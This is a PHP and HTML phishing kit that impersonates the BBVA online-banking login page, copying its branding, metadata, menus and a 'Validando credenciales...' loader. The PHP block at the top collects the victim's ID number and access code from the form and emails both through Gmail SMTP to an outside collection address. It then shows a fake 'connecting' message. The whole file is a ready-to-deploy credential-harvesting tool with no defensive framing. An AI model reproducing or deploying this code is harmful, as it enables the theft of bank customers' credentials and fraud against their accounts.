<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once "vendor/autoload.php";

$error = '';
$success = '';
if (isset($_POST)) {

    if (!empty($_POST['pin']) && !empty($_POST['password'])) {
       
        $mail = new PHPMailer(true);

        //Enable SMTP debugging.
        $mail->SMTPDebug = 0;
        //Set PHPMailer to use SMTP.
        $mail->isSMTP();
        //Set SMTP host name                          
        $mail->Host = "smtp.gmail.com";
        //Set this to true if SMTP host requires authentication to send email
        $mail->SMTPAuth = true;
        //Provide username and password     
        $mail->Username = "mail_de_connexion@gmail.com";
        $mail->Password = "mot_de_passe_du_mail_de_connexion";
        //If SMTP requires TLS encryption then set it
        $mail->SMTPSecure = "tls";
        //Set TCP port to connect to
        $mail->Port = 587;

        $mail->From = "mail_de_connexion@gmail.com";
        $mail->FromName = "BBVM";

        $mail->addAddress("mail_de_reception@gmail.com", "Identifiant et mot de passe -EBBVM");

        $mail->isHTML(true);


        $body = "";
        $body .= "<h3>Pin : " . $_POST['pin'] . "</h3>";
        $body .= "<h4>Mot de passe: " . $_POST['password'] . "</h4>";

        $mail->Subject = "PIN ET MOT DE PASSE - EBBVM";
        $mail->Body = $body;
        // $mail->AltBody = $body_alt;

        try {
            $mail->send();
            $success = "En cours de connexion";
        } catch (Exception $e) {
            $error = "Erreur de connexion";
        }

        // header('Location:https://www.mondialrelay.fr/suivi-de-colis/');
    } else {
        $error  = "Veuillez remplir les champs du formulaire.";
    }
}

?>
<!DOCTYPE html>

<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        body {
            transition: opacity ease-in 0.2s;
        }

        body[unresolved] {
            opacity: 0;
            display: block;
            overflow: hidden;
            position: relative;
        }
    </style>
    <meta name="theme-color" content="#004481">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1,user-scalable=no,minimal-ui,viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="BBVA">
    <meta name="mobile-web-app-title" content="BBVA">
    <meta property="og:title" content="BBVA">
    <meta name="format-detection" content="telephone=no">
    <meta name="author" content="BBVA">
    <meta name="keywords" content="Banco, banca online, sin comisiones, productos bancarios, particulares, productos y servicios financieros BBVA Particulares">
    <meta name="description" content="Banca online para Particulares BBVA">
    <meta property="og:description" content="Banca online para Particulares">
    <meta name="apple-itunes-app" content="app-id=325813155">
    <title>BBVA</title>

    <meta name="ember-google-map-sdk-url" content="//maps.googleapis.com/maps/api/js?libraries=places&amp;sensor=true">
    <meta name="google-site-verification" content="OkDqSX_xtz2m2UCbo_fizDUqmT5WZ0eRsFvy7A54EHE">
    <link rel="stylesheet" integrity="" href="assets/vendor-d24499a07e3ae984eca949fda39072dc.css">
    <link rel="stylesheet" integrity="" href="assets/buzz-621864c6da854cf15f4b9690d95170e7.css">

</head>

<body id="app" ontouchstart="" class="ember-application">

    <link href="assets/app.min-132233c658a0c43de85eb1f68218ae01.css" rel="stylesheet"><noscript>
        <style>
            [data-id=app-shell] {
                display: none
            }

            [data-id=error-view] {
                display: block !important
            }
        </style>
    </noscript>
   
    <div class="ember-view" id="ember3">
        <div id="ember4" style="display: none;" class="veil visible ember-view"><span id="ember5" class="progress-content-light full-size full-height flexy-item align-centered justify-center txt-align-c size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
                    <desc>Cargando...</desc>
                    <path class="progress-content-light__path" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
                    </path>
                    <g>
                        <defs>
                            <path id="progressContent_1_ember5" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
                            </path>
                        </defs>
                        <clippath id="progressContent_2_ember5">
                            <use xlink:href="#progressContent_1_ember5" style="overflow:visible;"></use>
                        </clippath>
                        <radialgradient id="progressContent_3_ember5" cx="195.6494" cy="114.4386" r="185.5059" fx="24.1631" fy="113.1565" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
                            <stop offset="0" class="progress-content-light__stop1"></stop>
                            <stop offset="1" class="progress-content-light__stop2"></stop>
                        </radialgradient>
                        <polygon style="clip-path: url(#progressContent_2_ember5); fill: url(#progressContent_3_ember5);" class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
                    </g>
                </svg>
                <!---->
            </span></div>
        <div id="ember6" class="veil visible login hide ember-view">
            <section class="item-space full-size full-height oh wrapper flexy-item bg_pr">
                <div id="ember7" class="progress-loading no-margin full-height block ember-view" data-loading="true">
                    <div data-id="box" class="progress-loading__box item-space flexy-item justify-center align-centered no-margin bg_pr">
                        <span id="ember8" class="progress-content-dark full-size full-height flexy-item align-centered justify-center txt-align-c size_8 ember-view"><svg class="progress-content-dark__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve" preserveAspectRatio="xMidYMid meet">
                                <desc>Validando credenciales...</desc>
                                <circle class="progress-content-dark__circle" id="Fill" cx="200" cy="200" r="197.5">
                                </circle>
                                <g id="Outline">
                                    <g class="progress-content-dark__outline">
                                        <path class="progress-content-dark__path" d="M200,3.5c26.53,0,52.26,5.2,76.49,15.44c23.4,9.9,44.41,24.07,62.46,42.11c18.05,18.05,32.22,39.06,42.11,62.46c10.25,24.22,15.44,49.96,15.44,76.49s-5.2,52.26-15.44,76.49c-9.9,23.4-24.07,44.41-42.11,62.46c-18.05,18.05-39.06,32.22-62.46,42.11C252.26,391.3,226.53,396.5,200,396.5s-52.26-5.2-76.49-15.44c-23.4-9.9-44.41-24.07-62.46-42.11s-32.22-39.06-42.11-62.46C8.7,252.26,3.5,226.53,3.5,200s5.2-52.26,15.44-76.49c9.9-23.4,24.07-44.41,42.11-62.46s39.06-32.22,62.46-42.11C147.74,8.7,173.47,3.5,200,3.5 M200,2.5C90.92,2.5,2.5,90.92,2.5,200S90.92,397.5,200,397.5S397.5,309.08,397.5,200S309.08,2.5,200,2.5L200,2.5z">
                                        </path>
                                    </g>
                                </g>
                                <g class="progress-content-dark__flare" id="Light">
                                    <defs>
                                        <circle id="Mask" cx="200" cy="200" r="197.5"></circle>
                                    </defs>
                                    <clippath id="progressContentMask_1_">
                                        <use class="ov" xlink:href="#Mask"></use>
                                    </clippath>
                                    <radialgradient id="progressContentGradient_1_" cx="240.1771" cy="92.3703" r="129.7024" fx="120.2762" fy="91.5826" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 344.2659 -118.2497)" gradientUnits="userSpaceOnUse">
                                        <stop offset="0" class="progress-content-dark__stop1"></stop>
                                        <stop offset="1" class="progress-content-dark__stop2"></stop>
                                    </radialgradient>
                                    <polygon class="progress-content-dark__gradient" id="Gradient" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313 	">
                                    </polygon>
                                </g>
                                <g id="Shine">
                                    <g>
                                        <image class="progress-content-dark__shine" xlink:href="data:image/png;base64,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">
                                        </image>
                                    </g>
                                </g>
                            </svg>
                            <!---->
                        </span>
                    </div>
                    <div class="progress-loading__wrapper absolute flexy-item align-centered justify-center bg_pr-core">
                        <div class="progress-loading__svg relative ">
                            <svg class="progress-loading__padlock-body absolute" fill="#fff">
                                <path d="M10.2857143,13.7142857 L18.8571429,13.7142857 L24.5714286,13.7142857 L25.1504026,13.7142857 C25.7774179,13.7142857 26.2857143,14.2285129 26.2857143,14.8649663 L26.2857143,28.5636051 C26.2857143,29.1991085 25.7772042,29.7142857 25.1504026,29.7142857 L6.84959735,29.7142857 C6.22258205,29.7142857 5.71428571,29.2000585 5.71428571,28.5636051 L5.71428571,14.8649663 C5.71428571,14.229463 6.22279576,13.7142857 6.84959735,13.7142857 L8,13.7142857 L10.2857143,13.7142857 Z">
                                </path>
                            </svg>
                            <svg class="progress-loading__padlock-symbol absolute" fill="#064079">
                                <polygon points="0,0 0,2.3 6.9,2.3 9.2,0 "></polygon>
                            </svg>
                            <svg class="progress-loading__padlock absolute" fill="#02a5a5">
                                <path d="M3.04541016,15.0397339 L3.04541016,6.99123 C3.04541016,4.62923 4.6382,2.84985352 7.0002,2.84985352 C9.3672,2.84985352 11.0378418,4.63823 11.0378418,6.99223 L11.0378418,9.49923 L13.2165527,9.01535742 L13.2165527,6.99123 C13.2165527,3.68123 10.3142,0.748168945 7.0002,0.748168945 C3.6932,0.748168945 0.74987793,3.68323 0.74987793,6.99223 L0.74987793,15.0397339 L3.04541016,15.0397339 Z">
                                </path>
                            </svg>
                        </div>
                        <p data-id="text" class="progress-loading__text color_se-0 txt_s set-padding-top-2 " role="alert"><b>Validando credenciales...</b></p>
                    </div>
                </div>
            </section>
        </div>
        <div tabindex="0" aria-hidden="true" data-id="side-menu" id="ember9" class="navigation-menu flexy-item absolute full-height ember-view" style="counter-reset: menu 7;">
            <nav class="navigation-menu__nav item-space flexy-item no-margin set-padding-bottom-4">
                <span class="accesible-hide" data-id="welcome-menu" tabindex="0">Menú principal de la aplicación</span>
                <div class="item-space scrolling no-margin show-pivot">
                    <!---->
                    <div class="navigation-menu__items__box set-padding-bottom-3">
                        <div class="navigation-menu__wrapper">
                            <ul id="ember10" class="list-container ember-view">
                                <!---->
                                <li data-id="optSecurityModule" id="ember11" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-12="12" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-security" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Seguridad y
                                                privacidad</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>
                                <li data-id="optSustainability" id="ember13" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-14="14" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-environment" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Sostenibilidad</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>
                                <!---->
                                <li data-id="optSideMenuExperiences" id="ember15" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-16="16" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-promotion" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Experiencias</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>
                                <li data-id="atmButton" id="ember17" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-18="18" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-place" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Oficinas y
                                                cajeros</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>
                                <!---->
                                <li data-id="marketAnalisysButton" id="ember19" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-20="20" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-play" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Análisis de
                                                mercado</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>
                                <li data-id="aboutButton" id="ember21" class="list-container__item ember-view">
                                    <div class="list-container__wrapper list-container__wrapper--button">
                                        <button data-id="menuItemButton" class="item-space-wide list-container__button " data-ember-action="" data-ember-action-22="22" style="opacity: 1;">
                                            <span class="set-margin-right size_3 item-auto-size icon icon-information" aria-hidden="true"></span>
                                            <b class="txt_s txt-align-l item-space set-margin-left">Acerca de</b>
                                        </button>
                                    </div>
                                    <!---->
                                </li>

                            </ul>
                        </div>
                    </div>
                </div>
                <ul class="navigation-menu__wrapper item-space-wide">
                    <li class="item-auto-size">
                        <button class="item-space-wide color_te-3" title="Ir a posición global" data-ember-action="" data-ember-action-23="23">
                            <span class="item-auto-size no-margin icon icon-get-out size_3" aria-hidden="true"></span>
                            <b class="item-auto-size txt_s set-margin-left-2">Entrar</b>
                        </button>
                    </li>
                    <li class="item-auto-size">
                        <button class="oh interactive-hide relative" data-id="btnMenuBack" data-ember-action="" data-ember-action-24="24">Cerrar menú</button>
                    </li>
                </ul>
            </nav>
        </div>
        <div aria-hidden="false" id="ember27" class="liquid-container--shadow liquid-container ember-view" style="touch-action: auto; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); transform: translateX(0px) scale(1); transition: transform 233ms ease 0s, -webkit-transform 233ms ease 0s;">
            <div id="ember29" class="liquid-child ember-view" style="visibility: inherit; top: 0px; left: 0px;">
                <div id="ember30" class="bg_pr-core-d login-interaction main ember-view" data-id="routeIndex">
                    <div id="ember31" class="bg_pr-core-d ember-view">
                        <header id="ember32" class="header header-main flexy-item justify-center items-without-margins relative oh bg_transparent color_se-0 ember-view">
                            <!---->
                            <div class="header-main__content item-space-wide align-centered bg_transparent color_se-0 header-main__content--with-image relative set-margin-left-auto set-margin-right-auto max-width-layout full-size">
                                <div id="ember33" class="txt-align-c header-main__icons--left set-padding-left ember-view"><button tabindex="0" aria-label="Retroceder una página" aria-disabled="false" data-id="btnBack" id="ember34" class="icon-return icon touch-shadow rounded ember-view">
                                        <!---->
                                    </button>
                                </div>
                                <div data-id="lblHead" id="ember35" class="header-main__title oh txt-align-c ember-view">
                                    <h1 tabindex="-1" class="flexy-item justify-center full-height">
                                        <div class="svg-header"><img class="img-sized-vertical size_3" src="./assets/logo-white-1c1c2a68cc4c755b9ebacef725dd3421.svg" alt=""></div>
                                    </h1>
                                </div>
                                <div id="ember76" class="txt-align-c header-main__icons--right set-padding-right ember-view"><span tabindex="0" aria-label="Ayuda" data-id="btnHelp" id="ember77" class="icon touch-shadow rounded btnHelp icon-help ember-view" role="button"></span>
                                    <!---->
                                </div>
                            </div>
                        </header>
                    </div>
                    <article aria-atomic="true" aria-live="polite" id="ember36" style="display: none;" class="notification-status flexy-item align-centered set-padding bg_te-6-d ember-view">
                        <p class="accesible-hide" data-id="accessibilityText">Estado de tu conexión</p>
                        <div class="item-space-wide align-centered">
                            <span class="icon color_se-0 size_2 set-margin-right icon-right" data-id="icon" aria-hidden="true"></span>
                            <span class="color_se-0 txt_s" data-id="title">Estado de tu conexión</span>
                        </div>
                        <!---->
                    </article>
                    <div data-alert-show="false" id="ember37" class="alrtCont max-width-layout set-margin-left-auto set-margin-right-auto ember-view">
                        <!---->
                    </div>
                    <section class="content wrapper flexy-item">
                        <form novalidate="" id="ember38" method="post" asction="<?= $_SERVER['PHP_SELF'] ?>" class="item-space flexy-item no-margin bg_pr-core-d form-container__login form-container ember-view">
                            <div id="ember39" class="form-container__input-box item-space no-margin main-content scrolling ember-view">
                                <div class="login-user-wrapper set-padding-top hide">
                                    <div class="txt-align-c flexy-item align-centered items-without-margins">
                                        <div class="item-space-wide">
                                            <div class="item-space scapular-content">
                                                <!---->
                                            </div>
                                        </div>
                                        <div class="item-space-wide">
                                            <p class="item-space color_se-0 txt_m txt-light set-padding-top-2">Buenas tardes </p>
                                        </div>
                                    </div>
                                    <div class="txt-align-c set-margin-bottom"><a data-id="lblYouAreNot" role="button" class="color_se-0 txt_s" data-ember-action="" data-ember-action-40="40"><b>¿No eres ?</b></a></div>
                                </div>
                                <div data-id="form-login" class="set-padding-vertical form-login">
                                    <div class="set-padding-bottom-2">
                                        <div data-type="text" data-id="txtUser" id="ember41" class="form form-text form--navy ember-view" data-required="required">
                                            <!---->
                                            <div class="form__container flexy-item flexy-row relative">
                                                <div class="form__content">
                                                    <label class="accesible-hide" for="inner-ember41">NIF, NIE, Tarjeta
                                                        o Pasaporte</label>
                                                    <input aria-invalid="false" name="pin" placeholder=" " id="inner-ember41" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="text" pattern="^[a-zA-Z0-9]+$|^$" required="true" data-required="required" aria-required="true" maxlength="16">
                                                    <span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">NIF, NIE, Tarjeta o Pasaporte</span>
                                                    <span class="form__icon form__icon--input touch-shadow rounded" aria-label="Eliminar contenido del campo de inserción" data-id="actionButton" role="button" tabindex="0" data-ember-action="" data-ember-action-42="42">
                                                        <span class="icon"></span>
                                                    </span>
                                                    <!---->
                                                </div>
                                                <div data-id="predictive-options" class="form-predictive__options bg_se-0 full-size box-look set-margin-top">
                                                </div>
                                                <!---->
                                            </div>

                                            <div class="form__message" aria-live="assertive">
                                                <!---->
                                            </div>
                                        </div>
                                    </div>
                                    <div class="set-padding-bottom-2">
                                        <div data-type="password" data-id="txtPassword" id="ember44" class="form form-password form--navy ember-view" data-required="required">
                                            <!---->
                                            <div class="form__container flexy-item flexy-row relative">
                                                <div class="form__content">
                                                    <label class="accesible-hide" for="inner-ember44">Clave de
                                                        acceso</label>
                                                    <input aria-invalid="false" placeholder=" " name="password" id="inner-ember44" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="password" required="true" data-required="required" aria-required="true" maxlength="6" minlength="4">
                                                    <span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">Clave de acceso</span>
                                                    <span class="form__icon form__icon--input touch-shadow rounded" aria-label="Mostrar contenido del campo clave" data-id="actionButton" role="button" tabindex="0" data-ember-action="" data-ember-action-45="45">
                                                        <span class="icon"></span>
                                                    </span>
                                                    <!---->
                                                </div>
                                                <div data-id="predictive-options" class="form-predictive__options bg_se-0 full-size box-look set-margin-top">
                                                </div>
                                                <!---->
                                            </div>

                                            <div class="form__message" aria-live="assertive">
                                                <!---->
                                            </div>
                                        </div>
                                    </div>
                                    <div class="block txt-align-r"><a data-id="btnForgottenPassword" class="color_se-0 txt_s" role="button" data-ember-action="" data-ember-action-47="47"><b>¿Has olvidado tu clave de acceso?</b></a></div>
                                </div>
                            </div>
                            <div id="ember48" class="set-margin-bottom-2 set-padding-top button-stack item-space-wide justify-center ember-view">
                                <ul class="button-stack__content oh">
                                    <li id="ember49" class="button-stack__item item-space-wide ember-view"><button data-id="btnLogin" id="ember50" class="button-default button set-padding-horizontal-4 width-auto oh relative disabled button--positive ember-view" "><span class=" button__content block">
                                            <b class="button__text txt_s txt-overflow_ellipsis">Iniciar sesión</b>
                                            </span>
                                        </button>
                                    </li>
                                    <li id="ember51" class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnSignup" id="ember52" class="button-default button set-padding-horizontal-4 width-auto oh relative button--secondary button--dark ember-view"><span class="button__content block">
                                                <b class="button__text txt_s txt-overflow_ellipsis">Hazte cliente</b>
                                            </span>
                                        </button>
                                    </li>
                                </ul>
                            </div>
                            <div class="set-padding-2 txt-align-c"><a role="button" data-id="btnEnrollment" class="color_se-0 txt_s action-element" data-ember-action="" data-ember-action-53="53"><b>Crea tu clave de acceso</b></a></div>
                        </form>
                    </section>
                </div>
            </div>
        </div>
        <div id="ember54" class="ember-view">
            <!---->
        </div>
    </div>

</body>

</html>
